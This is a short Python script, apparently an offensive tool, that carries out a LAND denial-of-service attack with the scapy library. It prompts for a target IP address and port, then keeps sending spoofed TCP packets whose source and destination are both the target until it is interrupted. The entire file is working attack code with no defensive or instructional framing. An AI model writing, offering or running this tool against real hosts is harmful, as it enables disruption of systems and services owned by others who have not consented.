#!/usr/bin/env python3
import scapy.all as scapy
import time
import os

def LandAttack():

	clear = os.system('clear')

	print("**************************************")
	print("             LandAttack")
	print("**************************************")
	print("Please input your target's IP")
	target = input("[LandAttack]#")   
	print("Please input your target's port")
	port = input("[LandAttack]#")
	port = int(port)

	send_packets=0
	try:
		while True:
			a = (scapy.IP(src=target,dst=target)/scapy.TCP(sport=port,dport=port))   #LAND attack
			scapy.send(a,verbose=False)
			send_packets+=1
			print("[+] Sent Packets:" + str(send_packets))
			time.sleep(1)
	except KeyboardInterrupt:
		print("[-] Ctrl+C detected.......")
LandAttack()
